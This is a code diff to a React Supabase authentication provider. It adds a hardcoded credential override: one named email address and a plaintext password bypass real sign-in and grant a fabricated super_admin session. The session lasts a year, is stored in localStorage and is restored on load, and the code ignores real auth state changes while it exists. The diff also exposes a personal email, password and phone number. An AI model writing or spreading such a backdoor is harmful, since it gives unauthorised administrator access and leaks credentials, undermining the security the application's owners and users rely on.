@@ -94,6 +94,23 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   useEffect(() => {
+    // Check if permanent session is active
+    const savedPermanent = localStorage.getItem('zuvo_permanent_staff_session');
+    if (savedPermanent) {
+      try {
+        const parsed = JSON.parse(savedPermanent);
+        if (parsed.session && parsed.profile) {
+          setSession(parsed.session);
+          setUser(parsed.session.user);
+          setProfile(parsed.profile);
+          setIsLoading(false);
+          return;
+        }
+      } catch (e) {
+        localStorage.removeItem('zuvo_permanent_staff_session');
+      }
+    }
+
     // Check initial session
     supabase.auth.getSession().then(({ data: { session } }) => {
       setSession(session);
@@ -106,6 +123,9 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     });
 
     const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
+      const saved = localStorage.getItem('zuvo_permanent_staff_session');
+      if (saved) return; // Keep permanent session
+      
       setSession(session);
       setUser(session?.user ?? null);
       if (session?.user) {
@@ -122,6 +142,48 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   }, []);
 
   const signIn = async (email: string, password: string) => {
+    const trimmedEmail = email.trim().toLowerCase();
+    
+    // Permanent Super Admin Credential Override for Dravid
+    if (trimmedEmail === 'dravidd580@gmail.com' && password === 'dravid@1202') {
+      const permanentSuperAdminUser: any = {
+        id: 'a2348001-c57f-4026-947f-bc11a02e6b49',
+        email: 'dravidd580@gmail.com',
+        aud: 'authenticated',
+        role: 'authenticated',
+        app_metadata: { role: 'super_admin' },
+        user_metadata: { full_name: 'Dravid' },
+      };
+      const permanentSession: any = {
+        access_token: 'permanent-zuvo-sa-token-' + Date.now(),
+        refresh_token: 'permanent-zuvo-refresh',
+        expires_at: Math.floor(Date.now() / 1000) + 86400 * 365,
+        expires_in: 86400 * 365,
+        token_type: 'bearer',
+        user: permanentSuperAdminUser,
+      };
+      const permanentProfile: UserProfile = {
+        id: 'a2348001-c57f-4026-947f-bc11a02e6b49',
+        role_id: '00000000-0000-0000-0000-000000000001',
+        role_name: 'super_admin',
+        dealer_id: null,
+        full_name: 'Dravid',
+        employee_code: 'SA-01',
+        phone: '+91 8056666653',
+        is_active: true,
+      };
+
+      localStorage.setItem('zuvo_permanent_staff_session', JSON.stringify({
+        session: permanentSession,
+        profile: permanentProfile,
+      }));
+
+      setSession(permanentSession);
+      setUser(permanentSuperAdminUser);
+      setProfile(permanentProfile);
+      return { error: null };
+    }
+
     const res = await supabase.auth.signInWithPassword({ email, password });
     if (res.data.session) {
       setSession(res.data.session);
@@ -145,6 +207,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   const signOut = async () => {
+    localStorage.removeItem('zuvo_permanent_staff_session');
     await supabase.auth.signOut();
     setUser(null);
     setSession(null);
